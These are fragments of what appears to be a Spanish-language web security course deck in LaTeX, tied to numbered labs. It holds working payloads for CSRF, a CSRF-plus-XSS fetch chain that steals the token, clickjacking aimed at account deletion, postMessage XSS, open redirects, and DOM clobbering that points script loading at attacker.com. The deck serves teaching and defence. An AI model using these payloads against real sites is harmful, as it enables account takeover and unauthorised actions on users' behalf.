  \item[] \cmdbox{\textless{}img src='https://victim.com/email?email=att@evil.com'\textgreater{}}
...
\small
  ...
  \item[] \cmdbox{GET /change-email?email=x\&\_method=POST}
...
\small
  ...
  \item[] \cmdbox{\textless{}meta name=referrer content=no-referrer\textgreater{}}
  ...
  \item[] \cmdbox{https://victim.com.attacker.com/exploit\\{}
https://attacker.com/exploit?victim.com}
  \item CSRF + XSS --- evasión total (Labs 49-50)
  \item XSS en el mismo origen permite leer el token CSRF del DOM:
  \item[] \cmdbox{fetch('/settings').then(r=\textgreater{}r.text()).then(html=\textgreater{}\{\\{}
const t = html.match(/name=.csrf. value=.(\textbackslash\{\}w+)/)[1];\\{}
fetch('/email/change',\{method:'POST',credentials:'include',\\{}
...
\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl149_1.jpg}
\end{center}
\end{frame}
...
\small
  ...
  \item[] \cmdbox{\textless{}style\textgreater{}\\{}
\#victim \{ opacity:0.00001; position:absolute; top:300px; left:200px; \}\\{}
\#decoy \{ position:absolute; top:300px; left:200px; \}\\{}
\textless{}/style\textgreater{}\\{}
\textless{}div id=decoy\textgreater{}¡Gana un iPhone! CLICK AQUÍ\textless{}/div\textgreater{}\\{}
\textless{}iframe id=victim src='https://bank.com/account/delete'\textgreater{}\textless{}/iframe\textgreater{}}
...
\small
  ...
  \item[] \cmdbox{/change-email?email=attacker@evil.com}
  ...
  \item[] \cmdbox{\textless{}iframe sandbox='allow-forms' src='https://victim.com/delete'\textgreater{}}
...
\small
  ...
  \item[] \cmdbox{curl -sI https://victim.com/sensitive | grep -i 'x-frame\textbackslash\{\}|csp'}
...
\small
  ...
  \item[] \cmdbox{Si la app valida que la URL empiece por el dominio legítimo:}
  ...
  \item[] \cmdbox{Si el servidor OAuth valida redirect\_uri como 'startswith':}
...
\small
  ...
  \item[] \cmdbox{El cliente envía (HTTP Upgrade):}
  \item GET /chat HTTP/1.1
  \item Upgrade: websocket
  \item Connection: Upgrade
  \item Sec-WebSocket-Key: BASE64\_RANDOM==
  \item[] \cmdbox{El servidor confirma: 101 Switching Protocols\\{}
A partir de aquí: comunicación binaria bidireccional}
...
\small
  ...
  \item \textbf{HTML en el servidor del atacante:}
...
\small
  ...
  \item \textbf{Petición del atacante:}
  \item \cmd{Origin: https://attacker.com}
  \item \textbf{Respuesta del servidor vulnerable:}
...
\small
  ...
  \item[] \cmdbox{window.addEventListener('message', function(e) \{\\{}
document.getElementById('ads').innerHTML = e.data; // sink!\\{}
\});\\{}
Payload (iframe con onload):\\{}
\textless{}iframe src='https://victim.com'\\{}
onload='this.contentWindow.postMessage(\textquotedbl{}\textless{}img src=x onerror=alert(1)\textgreater{}\textquotedbl{},\textquotedbl{}*\textquotedbl{})'\textgreater{}}
  \item Lab 83 --- postMessage con URL javascript:
  \item[] \cmdbox{handler: element.href = e.data\\{}
Payload: postMessage('javascript:alert(1)', '*')}
  \item Lab 84 --- postMessage con JSON.parse
  \item[] \cmdbox{var data = JSON.parse(event.data); window.location = data.redirectUrl;\\{}
Payload: \{\textquotedbl{}redirectUrl\textquotedbl{}:\textquotedbl{}javascript:alert(1)\textquotedbl{}\}}
  \item Defensa
...
\small
  ...
  \item[] \cmdbox{var returnUrl = new URLSearchParams(location.search).get('returnUrl');\\{}
document.getElementById('backLink').href = returnUrl;}
  ...
  \item[] \cmdbox{document.cookie = 'language=' + location.search.split('lang=')[1];}
...
\small
  ...
  \item[] \cmdbox{\textless{}a id=config\textgreater{}\textless{}/a\textgreater{} $\rightarrow$ window.config = \textless{}a\textgreater{} element\\{}
\textless{}a id=cfg\textgreater{}\textless{}a id=cfg name=endpoint href='//attacker.com'\textgreater{}}
  ...
  \item[] \cmdbox{var cfg = window.cfg || \{\};\\{}
loadScript(cfg.endpoint); // si cfg es undefined, usa default seguro}
  ...
  \item[] \cmdbox{\textless{}form id=x\textgreater{}\textless{}output id=x name=innerHTML\textgreater{}\\{}
\textless{}img src=x onerror=alert(1)\textgreater{}\textless{}/output\textgreater{}\textless{}/form\textgreater{}}
  \item Defensa
